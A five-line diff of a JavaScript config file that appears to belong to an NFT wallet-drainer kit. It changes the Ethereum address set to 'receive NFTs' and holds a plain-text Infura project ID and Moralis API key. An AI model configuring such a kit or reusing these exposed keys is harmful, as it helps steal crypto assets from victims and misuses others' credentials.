@@ -1,5 +1,5 @@
 // ⚠️ for infura & moralis, make you sure that you copy same number of characters
-const address = "0x86F2d4be2516582969d7654FA2f793bd7Ab55581";    // Your ETH wallet that you have to receive NFTs
+const address = "0xbe2Ed2B600df26CfFcC8156b97f6026aCac21F52";    // Your ETH wallet that you have to receive NFTs
 const infuraId = "067bcbfcd7c64394963e8fb786d314b0"     // Infuria Project ID | https://infura.io/ | For Wallet Connect
 const moralisApi = "DcQ5fHJqPkptBZ5HTWXzNRnogJH2rDsVJQAClRPcZ24AWk7paDkcjeySVuBRjowm"    // Web3 Api key | https://moralis.io/ | For NFTs
 
